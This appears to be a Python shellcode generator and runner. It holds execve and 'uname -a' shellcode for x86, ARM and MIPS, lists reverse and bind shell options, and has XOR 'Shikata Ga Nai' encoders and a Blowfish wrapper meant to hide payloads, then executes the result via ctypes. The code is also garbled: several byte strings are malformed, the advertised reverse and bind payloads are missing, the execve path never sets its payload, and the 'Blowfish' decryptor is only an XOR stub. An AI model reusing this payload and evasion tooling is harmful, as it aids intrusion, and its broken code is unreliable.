import sys
import struct
import socket
import ctypes
import random
from optparse import OptionParser
from Crypto.Cipher import Blowfish
from Crypto.Util.Padding import pad

# Set up the option parser
parser = OptionParser()

# Define options for architecture, shellcode type, IP, port, and debug mode
parser.add_option('--arch', dest='arch', default='x86', help='Choose architecture: x86, arm, or mips')
parser.add_option('--shellcode', dest='shellcode_type', default='execve', help='Choose shellcode type: execve (default), reverse, bind, or uname')
parser.add_option('--ip', dest='ip', default='127.0.0.1', help='IP address for reverse shell (default: 127.0.0.1)')
parser.add_option('--port', dest='port', default='8888', type="int", help='Port for reverse or bind shell (default: 8888)')
parser.add_option('--debug', action="store_true", dest='debug', default=False, help='Enable debug breakpoint (int3 for x86, bkpt for ARM, break for MIPS)')
parser.add_option('--pusscat', action="store_true", dest='pusscat', default=False, help='Use Shikata Ga Nai encoding instead of Blowfish encryption')
parser.add_option('--bitness', dest='bitness', default='32', help='Choose between 32-bit and 64-bit for the selected architecture (default: 32)')

(options, args) = parser.parse_args()

# Retrieve values from the parsed options
arch = options.arch.lower()
shellcode_type = options.shellcode_type.lower()
ip = options.ip
port = options.port
debug_enabled = options.debug
use_shikata = options.pusscat
bitness = options.bitness

# Convert IP and port to their binary representation for the shellcodes
try:
    ip_bytes = socket.inet_aton(ip)  # Convert IP address to binary (4 bytes)
    port_bytes = struct.pack('>H', port)  # Convert port number to network byte order (2 bytes)
except Exception as e:
    print(f"[-] Invalid IP or port: {e}")
    sys.exit(1)

# Blowfish encryption key (must be a multiple of 8 bytes)
blowfish_key = b'secretkeysecretk'

# Add the debug breakpoint if the flag is enabled
debug_breakpoint_x86 = b"\xCC" if debug_enabled else b""
debug_breakpoint_arm = b"\xe7\xf0\x01\xf0" if debug_enabled else b""  # bkpt instruction
debug_breakpoint_mips = b"\x00\x00\x00\x0d" if debug_enabled else b""  # break instruction

# Define different shellcodes for execve, reverse shell, bind shell, and uname -a
if shellcode_type == 'execve':
    print("[+] Selected shellcode: Local execve /bin/bash")

    # Local execve("/bin/bash") shellcode for x86 32-bit
    shellcode_execve_x86 = (
        b"\x31\xc0"               # xor eax, eax
        b"\x50"                   # push eax
        b"\x68\x2f\x2f\x62\x69"   # push 0x69622f2f
        b"\x68\x2f\x62\x61\x73"   # push 0x7361622f
        b"\x89\xe3"               # mov ebx, esp
        b"\x50"                   # push eax
        b"\x53"                   # push ebx
        b"\x89\xe1"               # mov ecx, esp
        b"\xb0\x0b"               # mov al, 0xb
        b"\xcd\x80"               # int 0x80
    )

    # Local execve("/bin/bash") shellcode for ARM 32-bit
    shellcode_execve_arm = (
        b"\xe3a0000b"              # mov r0, #11 (syscall number for execve)
        b"\xe59f0014"              # ldr r0, [pc, #20]  (address of "/bin/bash")
        b"\xe3a01000"              # mov r1, #0  (argv = NULL)
        b"\xe3a02000"              # mov r2, #0  (envp = NULL)
        b"\xef000000"              # svc 0 (syscall)
        b"\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x00"  # "/bin/bash"
    )

    # Local execve("/bin/bash") shellcode for MIPS 32-bit
    shellcode_execve_mips = (
        b"\x28\x04\xff\xff"        # slti a0, zero, -1
        b"\x3c\x1c\x2f\x2f"        # lui a3, 0x2f2f
        b"\x37\x9c\x62\x68"        # ori a3, a3, 0x6268
        b"\x3c\x0e\x62\x2f"        # lui a2, 0x622f
        b"\x35\xce\x6e\x2f"        # ori a2, a2, 0x6e2f
        b"\xaf\xa500\x04"          # sw a1, 4(sp)
        b"\x03\x20\xf8\x09"        # syscall
        b"\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x00"  # "/bin/bash"
    )

elif shellcode_type == 'uname':
    print("[+] Selected shellcode: uname -a")

    # uname -a shellcode for x86 32-bit
    shellcode_uname_x86 = (
        b"\x31\xc0"                 # xor eax, eax
        b"\x50"                     # push eax
        b"\x68\x61\x2d\x61\x00"     # push 'a -'
        b"\x68\x75\x6e\x61\x6d"     # push 'name'
        b"\x89\xe3"                 # mov ebx, esp
        b"\x50"                     # push eax
        b"\x53"                     # push ebx
        b"\x89\xe1"                 # mov ecx, esp
        b"\xb0\x0b"                 # mov al, 0xb (execve syscall)
        b"\xcd\x80"                 # int 0x80
    )

    shellcode = debug_breakpoint_x86 + shellcode_uname_x86

def shikata_ga_nai_encode_x86(shellcode):
    """Custom Shikata Ga Nai encoder for x86."""
    
    encoded_shellcode = bytearray()
    key = random.randint(1, 255)  # Random starting key

    # Add the decoder stub to the encoded shellcode (x86 version)
    decoder_stub = (
        b"\xeb\x11"  # jmp short 0x13 (jump to start of encoded shellcode)
        b"\x5e"      # pop esi (load address of encoded shellcode into esi)
        b"\x31\xc9"  # xor ecx, ecx (zero out ecx)
        b"\xb1" + bytes([len(shellcode)]) +  # mov cl, <length of shellcode> (set the loop counter)
        b"\x80\x36" + bytes([key]) +  # xor byte [esi], <key>
        b"\x46"      # inc esi (move to next byte)
        b"\xe2\xfa"  # loop 0x7 (repeat until ecx == 0)
        b"\xeb\x05"  # jmp short 0x5 (jump to decoded shellcode)
    )
    
    encoded_shellcode.extend(decoder_stub)
    
    # Perform the XOR encoding with the evolving key
    for byte in shellcode:
        encoded_byte = byte ^ key  # XOR with current key
        encoded_shellcode.append(encoded_byte)
        key = (key + encoded_byte) % 256  # Evolve the key

    return bytes(encoded_shellcode)

def shikata_ga_nai_encode_arm(shellcode):
    """Custom Shikata Ga Nai encoder for ARM."""
    
    encoded_shellcode = bytearray()
    key = random.randint(1, 255)  # Random starting key

    # Add the decoder stub to the encoded shellcode (ARM version)
    decoder_stub = (
        b"\xe28f3001"  # add r3, pc, #1  (load address of encoded shellcode)
        b"\xe12fff13"  # bx r3  (switch to thumb mode)
        b"\x01\x30\x8f\xe2"  # add r3, pc, #1
        b"\x13\xff\x2f\xe1"  # bx r3
        b"\x01\x20\x40\xe2"  # sub r2, r0, #1
        b"\x02\x00\x00\xe0"  # and r0, r0, r0
        b"\x02\x30\x12\xe3"  # tst r0, #2
        b"\x01\x00\xa0\xe1"  # mov r0, r1
        b"\x00\xff\xff\xff"  # nop (padding)
    )
    
    encoded_shellcode.extend(decoder_stub)
    
    # Perform the XOR encoding with the evolving key
    for byte in shellcode:
        encoded_byte = byte ^ key  # XOR with current key
        encoded_shellcode.append(encoded_byte)
        key = (key + encoded_byte) % 256  # Evolve the key

    return bytes(encoded_shellcode)

def shikata_ga_nai_encode_mips(shellcode):
    """Custom Shikata Ga Nai encoder for MIPS."""
    
    encoded_shellcode = bytearray()
    key = random.randint(1, 255)  # Random starting key

    # Add the decoder stub to the encoded shellcode (MIPS version)
    decoder_stub = (
        b"\x3c\x0f\xff\xff"  # lui t7, 0xffff  (load upper part of key into t7)
        b"\x35\xef\xff\xff"  # ori t7, t7, 0xffff (load lower part of key into t7)
        b"\x8de8\x0004"  # lw t0, 4(t7)
        b"\x240a\x0001"  # li t2, 1  (loop counter)
        b"\x2129\x0001"  # addi t1, t1, 1
        b"\x03\xe0\x20\x27"  # nor v0, zero, v0 (decoder loop)
    )
    
    encoded_shellcode.extend(decoder_stub)
    
    # Perform the XOR encoding with the evolving key
    for byte in shellcode:
        encoded_byte = byte ^ key  # XOR with current key
        encoded_shellcode.append(encoded_byte)
        key = (key + encoded_byte) % 256  # Evolve the key

    return bytes(encoded_shellcode)

# Check if the --pusscat option was selected for Shikata Ga Nai encoding
if use_shikata:
    print(f"[+] Using Shikata Ga Nai encoder for {arch} shellcode")
    
    if arch == 'x86':
        final_shellcode = shikata_ga_nai_encode_x86(shellcode)
    elif arch == 'arm':
        final_shellcode = shikata_ga_nai_encode_arm(shellcode)
    elif arch == 'mips':
        final_shellcode = shikata_ga_nai_encode_mips(shellcode)
    else:
        print(f"[-] Unsupported architecture: {arch}")
        sys.exit(1)
else:
    print("[+] Using Blowfish encryption for shellcode")
    # Initialize the Blowfish cipher in ECB mode for encryption
    cipher = Blowfish.new(blowfish_key, Blowfish.MODE_ECB)

    # Pad the shellcode to match the block size (Blowfish uses 8-byte blocks)
    block_size = Blowfish.block_size
    padded_shellcode = pad(shellcode, block_size)

    # Encrypt the shellcode using Blowfish
    encrypted_shellcode = cipher.encrypt(padded_shellcode)

    # Blowfish decryption routine for x86
    decryption_routine_x86 = (
        b"\x48\x8d\x35\x10\x00\x00\x00"  # lea rsi, [rip + shellcode] ; Load encrypted shellcode
        b"\x48\xc7\xc1\x08\x00\x00\x00"  # mov rcx, 8 ; Number of 8-byte blocks to decrypt
        b"\x48\xbb\xbe\xba\xfe\xca\xef\xbe\xad\xde"  # Load Blowfish key (simplified)
        b"\x48\x31\x1e"  # xor QWORD [rsi], rbx ; Decrypt block
        b"\x48\x83\xc6\x08"  # add rsi, 8 ; Move to next block
        b"\xe2\xf7"  # loop decrypt_loop
        b"\x48\x8d\x05\xf0\xff\xff\xff"  # lea rax, [rip + shellcode] ; Jump to decrypted shellcode
        b"\xff\xe0"  # jmp rax
    )

    final_shellcode = decryption_routine_x86 + encrypted_shellcode

# Print the final encoded or encrypted shellcode for reference
print(f"Final shellcode (hex): {final_shellcode.hex()}")

# Create a buffer to hold the final shellcode and make it executable
buf = ctypes.create_string_buffer(final_shellcode)
shell_func = ctypes.cast(buf, ctypes.CFUNCTYPE(None))

# Execute the shellcode (note: this will work for x86 architecture by default)
try:
    shell_func()
except Exception as e:
    print(f"[-] Shellcode execution failed: {e}")
